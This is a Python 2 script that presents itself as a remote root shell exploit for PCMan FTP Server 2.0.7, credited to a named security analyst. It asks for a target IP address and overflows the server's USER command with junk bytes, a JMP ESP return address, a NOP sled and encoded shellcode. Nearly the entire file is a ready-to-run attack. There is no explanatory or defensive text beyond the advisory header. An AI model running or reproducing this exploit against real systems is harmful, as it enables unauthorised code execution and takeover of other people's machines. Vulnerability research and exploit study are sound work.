#!/usr/bin/env python
import signal
from time import sleep
from socket import *
from sys import exit, exc_info
#
# Title************************PCMan FTP Server v2.0.7 Remote Root Shell Exploit - USER Command
# Discovered and Reported******June 2013 
# Discovered/Exploited By******Jacob Holcomb/Gimppy, Security Analyst @ Independent Security Evaluators
# Exploit/Advisory*************http://infosec42.blogspot.com/
# Software*********************PCMan FTP Server v2.0.7 (Listens on TCP/21)
# Tested Commands*************USER (Other commands were not tested and may be vulnerable) 
# CVE**************************PCMan FTP Server v2.0.7 Buffer Overflow: Pending
#
def sigHandle(signum, frm): # Signal handler
    
    print "\n[!!!] Cleaning up the exploit... [!!!]\n"
    sleep(1)
    exit(0)
def targServer():
    
    while True:    
        try:
            server = inet_aton(raw_input("\n[*] Please enter the IPv4 address of the PCMan FTP Server:\n\n>"))
            server = inet_ntoa(server)
            break
        except:
            print "\n\n[!!!] Error: Please enter a valid IPv4 address. [!!!]\n\n"
            sleep(1)
            continue
            
    return server   

def main():
      
    print ("""\n [*] Title************************PCMan FTP Server v2.0.7 Remote Root Shell Exploit - USER Command
 [*] Discovered and Reported******June 2013 
 [*] Discovered/Exploited By******Jacob Holcomb/Gimppy, Security Analyst @ Independent Security Evaluators
 [*] Exploit/Advisory*************http://infosec42.blogspot.com/
 [*] Software*********************PCMan FTP Server v2.0.7 (Listens on TCP/21)
 [*] Tested Commands*************USER (Other commands were not tested and may be vulnerable) 
 [*] CVE**************************PCMan FTP Server v2.0.7 Buffer Overflow: Pending""")
    signal.signal(signal.SIGINT, sigHandle) #Setting signal handler for ctrl + c
    victim = targServer()
    port = int(21)
    Cmd = "USER" #Vulnerable command
    JuNk = '\x42' * 2001
    #JuNk = '1345Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5CA'
    # KERNEL32.dll 7CA58265 - JMP ESP
    #ret = '\x47\x1D\xC7\x75'  
    ret = '\xcb\x01\xf4\x76'
    NOP = "\x90" * 50
    payload =  ""
    payload += "\x98\xf5\x91\x91\x4b\x4b\x90\x2f\x92\x42\xda\xda"
    payload += "\xd9\x74\x24\xf4\xb8\xde\x24\x1d\x2c\x5b\x31\xc9"
    payload += "\xb1\x56\x83\xc3\x04\x31\x43\x14\x03\x43\xca\xc6"
    payload += "\xe8\xd0\x1a\x84\x13\x29\xda\xe9\x9a\xcc\xeb\x29"
    payload += "\xf8\x85\x5b\x9a\x8a\xc8\x57\x51\xde\xf8\xec\x17"
    payload += "\xf7\x0f\x45\x9d\x21\x21\x56\x8e\x12\x20\xd4\xcd"
    payload += "\x46\x82\xe5\x1d\x9b\xc3\x22\x43\x56\x91\xfb\x0f"
    payload += "\xc5\x06\x88\x5a\xd6\xad\xc2\x4b\x5e\x51\x92\x6a"
    payload += "\x4f\xc4\xa9\x34\x4f\xe6\x7e\x4d\xc6\xf0\x63\x68"
    payload += "\x90\x8b\x57\x06\x23\x5a\xa6\xe7\x88\xa3\x07\x1a"
    payload += "\xd0\xe4\xaf\xc5\xa7\x1c\xcc\x78\xb0\xda\xaf\xa6"
    payload += "\x35\xf9\x17\x2c\xed\x25\xa6\xe1\x68\xad\xa4\x4e"
    payload += "\xfe\xe9\xa8\x51\xd3\x81\xd4\xda\xd2\x45\x5d\x98"
    payload += "\xf0\x41\x06\x7a\x98\xd0\xe2\x2d\xa5\x03\x4d\x91"
    payload += "\x03\x4f\x63\xc6\x39\x12\xeb\x2b\x70\xad\xeb\x23"
    payload += "\x03\xde\xd9\xec\xbf\x48\x51\x64\x66\x8e\xe0\x62"
    payload += "\x99\x40\x4a\xe2\x67\x61\xaa\x2a\xac\x35\xfa\x44"
    payload += "\x05\x36\x91\x94\xaa\xe3\x0f\x9f\x3c\xcc\x67\xe3"
    payload += "\x3c\xa4\x75\x1c\x38\x0c\xf0\xfa\x12\x3e\x52\x53"
    payload += "\xd3\xee\x12\x03\xbb\xe4\x9d\x7c\xdb\x06\x74\x15"
    payload += "\x76\xe9\x20\x4d\xef\x90\x69\x05\x8e\x5d\xa4\x63"
    payload += "\x90\xd6\x4c\x93\x5f\x1f\x25\x87\x88\x78\xc5\x57"
    payload += "\x49\xed\xc5\x3d\x4d\xa7\x92\xa9\x4f\x9e\xd4\x75"
    payload += "\xaf\xf5\x67\x71\x4f\x88\x51\x09\x66\x1e\xdd\x65"
    payload += "\x87\xce\xdd\x75\xd1\x84\xdd\x1d\x85\xfc\x8e\x38"
    payload += "\xca\x28\xa3\x90\x5f\xd3\x95\x45\xf7\xbb\x1b\xb3"
    payload += "\x3f\x64\xe4\x96\x43\x63\x1a\x64\x6c\xcc\x72\x96"
    payload += "\x2c\xec\x82\xfc\xac\xbc\xea\x0b\x82\x33\xda\xf4"
    payload += "\x09\x1c\x72\x7e\xdc\xee\xe3\x7f\xf5\xaf\xbd\x80"
    payload += "\xfa\x6b\x4e\xfa\x73\x8b\xaf\xfb\x9d\xe8\xb0\xfb"
    payload += "\xa1\x0e\x8d\x2d\x98\x64\xd0\xed\x9f\x77\x67\x53"
    payload += "\x89\x1d\x87\xc7\xc9\x37"

    sploit = Cmd + JuNk + ret + NOP + payload 
    sploit += "\x42" * (2992 - len(NOP + payload)) + "\r\n"

    try:
        print "\n [*] Creating network socket."
        net_sock = socket(AF_INET, SOCK_STREAM)
    except:
        print "\n [!!!] There was an error creating the network socket. [!!!]\n\n%s\n" % exc_info()       
        sleep(1)
        exit(0)    

    try:
        print " [*] Connecting to PCMan FTP Server @ %s on port TCP/%d." % (victim, port)
        net_sock.connect((victim, port))
    except:
        print "\n [!!!] There was an error connecting to %s. [!!!]\n\n%s\n" % (victim, exc_info())
        sleep(1)
        exit(0)
 
    try:
        print """ [*] Attempting to exploit the FTP USER command.
 [*] Sending 1337 ro0t Sh3ll exploit to %s on TCP port %d.
 [*] Payload Length: %d bytes.""" % (victim, port, len(sploit))
        net_sock.send(sploit)
        sleep(1)
    except:
        print "\n [!!!] There was an error sending the 1337 ro0t Sh3ll exploit to %s [!!!]\n\n%s\n" % (victim, exc_info())
        sleep(1)
        exit(0)

    try:
        print """ [*] 1337 ro0t Sh3ll exploit was sent! Fingers crossed for code execution!
 [*] Closing network socket. Press ctrl + c repeatedly to force exploit cleanup.\n"""
        net_sock.close()
    except:
        print "\n [!!!] There was an error closing the network socket. [!!!]\n\n%s\n" % exc_info()
        sleep(1)
        exit(0)


if __name__ == "__main__":
    main()